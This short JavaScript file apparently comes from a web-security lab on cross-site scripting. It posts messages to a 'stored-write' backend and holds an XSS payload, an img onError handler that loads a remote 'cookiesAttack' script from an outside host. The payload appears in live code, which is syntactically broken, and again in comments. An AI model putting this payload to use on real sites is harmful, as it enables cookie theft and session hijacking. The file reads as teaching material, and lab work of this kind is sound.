function sendForm() {
  const form = document.getElementById("message");
  fetch("backend/stored-write.php",
    {
      body: JSON.stringify({message: form.value}),
      method: "post"
    }).then(r => console.log(r));

}


//
function readUrl() {

  // document.getElementById('dom').innerHTML =
  //   decodeURIComponent(document.location.href).split('#')[1];
  document.body.innerHTML
    = "<img src='#' onError="
  let s;
  s = document.createElement('script');
  s.src = 'https://wt143.fei.stuba.sk/xss/cookiesAttack/index.js';
  document.body.appendChild(s);
}

//<script src="https://wt143.fei.stuba.sk/xss/cookiesAttack/index.js"></script>
//
/*
 document.body.innerHTML= "<img src='#' onError="let s;s = document.createElement('script');s.src = 'https://wt143.fei.stuba.sk/xss/cookiesAttack/index.js';document.body.appendChild(s);
 */





